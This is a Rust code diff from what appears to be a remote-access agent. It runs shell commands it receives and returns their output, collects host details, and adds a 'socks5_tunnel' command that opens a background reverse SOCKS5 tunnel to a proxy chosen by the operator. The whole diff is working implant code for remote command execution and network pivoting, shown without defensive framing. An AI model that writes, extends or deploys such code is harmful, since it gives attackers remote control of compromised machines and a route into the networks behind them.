@@ -1,13 +1,13 @@
-use std::io::{self, Error, ErrorKind, Read};
+use std::io::{self, ErrorKind, Read};
 use std::process::Command;
-use std::env;
 use std::fs;
 use std::path::Path;
-use serde_json::{json, Value};
-use uuid::Uuid;
+use serde_json::json;
 use hostname;
 use os_info;
 use std::net::UdpSocket;
+use crate::networking::socks5::Socks5Client;
+use std::time::Duration;
 
 #[cfg(windows)]
 fn create_command(command: &str, args: &[&str]) -> Command {
@@ -77,18 +77,52 @@ async fn execute_command(cmd_parts: &[&str]) -> io::Result<String> {
         return Ok(String::new());
     }
 
-    let output = if cfg!(windows) {
-        // Join all parts for Windows cmd.exe
-        let full_command = cmd_parts.join(" ");
-        create_command(&full_command, &[]).output()?
-    } else {
-        // Use first part as command and rest as args for Unix
-        create_command(cmd_parts[0], &cmd_parts[1..]).output()?
-    };
+    // Handle special commands
+    match cmd_parts[0] {
+        "socks5_tunnel" => {
+            if cmd_parts.len() != 4 {
+                return Err(io::Error::new(ErrorKind::InvalidInput, 
+                    "Usage: socks5_tunnel <proxy_host> <proxy_port> <local_port>"));
+            }
+            
+            let proxy_host = cmd_parts[1].to_string();
+            let proxy_port = cmd_parts[2].parse::<u16>()
+                .map_err(|e| io::Error::new(ErrorKind::InvalidInput, format!("Invalid proxy port: {}", e)))?;
+            let local_port = cmd_parts[3].parse::<u16>()
+                .map_err(|e| io::Error::new(ErrorKind::InvalidInput, format!("Invalid local port: {}", e)))?;
 
-    Ok(format!("{}{}", 
-        String::from_utf8_lossy(&output.stdout),
-        String::from_utf8_lossy(&output.stderr)))
+            // Create SOCKS5 client
+            let client = Socks5Client::new(proxy_host.clone(), proxy_port)
+                .with_timeout(Duration::from_secs(30));
+
+            // Start tunnel in background task
+            tokio::spawn(async move {
+                println!("[SOCKS5] Starting reverse tunnel to {}:{} on local port {}", 
+                    proxy_host, proxy_port, local_port);
+                
+                if let Err(e) = client.start_reverse_tunnel(local_port).await {
+                    println!("[ERROR] Reverse tunnel failed: {}", e);
+                }
+            });
+
+            return Ok(format!("Started SOCKS5 reverse tunnel on local port {}", local_port));
+        },
+        _ => {
+            // Handle regular shell commands
+            let output = if cfg!(windows) {
+                // Join all parts for Windows cmd.exe
+                let full_command = cmd_parts.join(" ");
+                create_command(&full_command, &[]).output()?
+            } else {
+                // Use first part as command and rest as args for Unix
+                create_command(cmd_parts[0], &cmd_parts[1..]).output()?
+            };
+
+            Ok(format!("{}{}", 
+                String::from_utf8_lossy(&output.stdout),
+                String::from_utf8_lossy(&output.stderr)))
+        }
+    }
 }
 
 fn stdin_ready() -> io::Result<bool> {
